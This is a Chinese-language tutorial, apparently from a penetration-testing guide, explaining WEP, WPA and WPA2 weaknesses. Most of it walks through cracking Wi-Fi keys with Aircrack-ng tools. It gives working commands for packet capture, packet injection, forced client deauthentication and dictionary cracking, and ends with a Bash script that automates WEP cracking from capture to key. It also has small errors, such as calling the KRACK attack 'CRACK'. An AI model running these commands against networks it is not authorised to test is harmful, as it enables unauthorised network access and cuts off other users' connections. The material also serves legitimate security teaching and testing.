    无线网络是现代通信基础设施不可或缺的一部分，为数字生活的几乎每个方面提供了便利性和访问性。然而，这种便利也伴随着重大的安全风险。由于数据是通过空中传输的，无线网络本质上容易受到各种攻击，任何拥有适当工具的人都可以拦截或操纵这些通信。理解无线网络的安全基础以及破解这些网络的技术，对于任何网络安全专业人员来说都是关重要的。


    # 无线网络安全基础


    无线网络安全基于各种协议和加密技术，旨在保护设备之间传输的数据。然而，并非所有协议都能提供相同级别的保护，许多网络仍然依赖易受攻击的遗留技术。


    ### WEP（等同传输隐私）

    最初，`WEP` 是为 Wi-Fi 网络引入的安全协议。它的设计目的是提供与有线网络同等的安全水平，但很快被发现存在多个关键漏洞。`WEP` 使用 `RC4`
    算法加密数据，但协议的实现存在缺陷，使得捕获了足够数据包的攻击者能够破解 `WEP` 密钥并访问网络。


    - **WEP 漏洞**：`WEP` 的主要弱点是在加密过程中重复使用初始化向量（`IV`）。攻击者可以捕获足够的数据包并使用 `Aircrack-ng`
    等工具对 `WEP` 密钥进行暴力破解。


    ### WPA（Wi-Fi 保护访问）

    为了修复 `WEP` 的缺陷，`WPA` 作为中间安全标准引入。`WPA` 仍然使用 `RC4` 算法，但引入了 `TKIP`（临时密钥完整性协议）来生成动态密钥并修复重复
    `IV` 的漏洞。尽管比 `WEP` 安全，但 `WPA` 仍然存在可以利用的漏洞，特别是在使用预共享密钥（`PSK`）的实现中。


    - **WPA 漏洞**：可以使用“握手捕获”（Handshake Capture）等攻击捕获客户端与接入点之间的认证过程。通过捕获，攻击者可以进行字典攻击或暴力破解来发现
    `PSK` 密钥。


    ### WPA2 和 WPA3

    取代 `WPA` 的 `WPA2` 使用 `AES`（高级加密标准）配合 `CCMP`（密码分组链消息认证码计数模式协议），提供了更稳健的安全。而 `WPA3`
    则引入了更多的改进，包括前向机密加密和针对离线字典攻击的防护。


    - **WPA2 漏洞**：尽管安全性显著提高，但 `WPA2` 并非无不可击。`CRACK`（密钥重装攻击）等攻击可以利用 `WPA2` 密钥协商中的漏洞来解密数据。


    理解这些协议及其漏洞是保护无线网络的第一步。然而，经验丰富的攻击者可以使用 `Aircrack-ng` 等正确工具利用这些弱点。


    # 常见的攻击，如 WEP/WPA 破解


    利用无线网络通常从破解这些协议的安全性开始。在最常见的方法中，破解 `WEP` 和 `WPA` 由于其已知漏洞是最频繁执行的攻击。


    ### WEP 破解

    由于协议固有的弱性，破解受 `WEP` 保护的网络是渗透测试人员或伦理黑客可以执行的基础任务之一。


    - **数据包捕获**：执行 `WEP` 破解的第一步是捕获在网络中传输的数据包。可以使用 `Airodump-ng` 工具完成：

    ```bash

    airodump-ng --bssid BSSID -c CHANNEL -w outputfile wlan0

    ```

    - 该命令监控由 `BSSID` 和 `channel` 指定的网络流量，并将捕获的数据包存储在输出文件中。


    - **数据包注入**：加速数据包捕获的常用技术是数据包注入，强制网络产生更多流量，为攻击者提供更多分析数据。可以使用 `Aireplay-ng` 工具注入数据包：

    ```bash

    aireplay-ng -3 -b BSSID -h CLIENT_MAC wlan0

    ```

    - 结果是攻击者在网络上产生流量，加速 `IVs` 的捕获过程。


    - **WEP 密钥破解**：一旦捕获了足够的数据包，可以使用 `Aircrack-ng` 破解 `WEP` 密钥：

    ```bash

    aircrack-ng -b BSSID -w wordlist.txt outputfile*.cap

    ```

    - 该命令尝试使用捕获的 `IVs` 破解 `WEP` 密钥。在 `WEP` 网络上，只要有足够的流量，几分钟即可破解密钥。


    ### WPA 破解

    `WPA` 破解比 `WEP` 破解更复杂，但它仍然是一种常见做法，特别是针对使用 `PSK` 密钥的网络。


    - **握手捕获**：要破解 `WPA` 网络，攻击者首先需要捕获接入点与客户端之间的认证握手。可以使用 `Airodump-ng` 完成：

    ```bash

    airodump-ng --bssid BSSID -c CHANNEL -w outputfile wlan0

    ```

    - 通过监控正确的通道，攻击者可以在设备连接到网络时捕获握手。


    - **客户端取消认证**：为了强制捕获握手，攻击者可以使用 `Aireplay-ng` 发送取消认证包，临时断开客户端与网络的连接：

    ```bash

    aireplay-ng --deauth 10 -a BSSID -c CLIENT_MAC wlan0

    ```

    - 这强制客户端重新连接，生成可以捕获的新握手。


    - **WPA 密钥破解**：捕获握手后，下一步是使用 `Aircrack-ng` 通过字典攻击破解 `WPA` 密钥：

    ```bash

    aircrack-ng -w wordlist.txt -b BSSID outputfile*.cap

    ```

    - 该命令尝试字典中的所有密码来破解 `WPA` 密钥。


    # Aircrack-ng 等工具及相关脚本


    `Aircrack-ng` 是任何需要对无线网络进行渗透测试的安全专业人员不可不可少的工具包。它包含了几个工具，可以轻松地捕获、分析和探索 Wi-Fi 网络。


    ### Airodump-ng

    `Airodump-ng` 用于捕获无线网络上传输的数据包。它可以识别附近所有的接入点，显示已连接设备的详情，并捕获破解 `WEP` 和 `WPA` 密钥所需的流量。


    **基础命令**：

    ```bash

    airodump-ng wlan0

    ```

    - 该命令显示所有可用无线网络和连接到它们的设备。


    ### Aireplay-ng

    `Aireplay-ng` 用于向网络注入数据包，强制产生流量并便于稍后分析数据包。


    **注入命令**：

    ```bash

    aireplay-ng -3 -b BSSID wlan0

    ```

    - 向 `WEP` 网络注入数据包以加速 `IV` 捕获。


    ### Aircrack-ng

    `Aircrack-ng` 是破解 `WEP` 和 `WPA` 密钥的工具。它处理捕获的数据包并尝试使用暴力破解或字典攻击破解密钥。


    **破解 WEP 密钥的命令**：

    ```bash

    aircrack-ng -b BSSID -w wordlist.txt capture_file.cap

    ```

    - 尝试字典中的所有密码来破解密钥。


    # 使用自定义脚本自动化

    在需要分析多个网络的场景，自动化破解过程是高效的。以下是自动化破解 `WEP` 和 `WPA` 网络的脚本示例。


    使用 Bash 自动化

    可以使用 `Bash` 脚本自动化破解 `WEP` 完整过程，从捕获到破解密钥。

    ```bash

    #!/bin/bash


    # 变量

    interface="wlan0"

    bssid="00:11:22:33:44:55"

    channel="6"

    output="wep_crack"


    # 捕获数据包

    airodump-ng --bssid $bssid -c $channel -w $output $interface &


    # 注入数据包

    aireplay-ng -3 -b $bssid $interface &


    # 等待数据包捕获足够

    sleep 300


    # 破解 WEP 密钥

    aircrack-ng -b $bssid $output*.cap

    ```

    该脚本自动化了数据包捕获和 `WEP` 密钥破解，让渗透测试人员在遗留网络上的工作更加轻松。

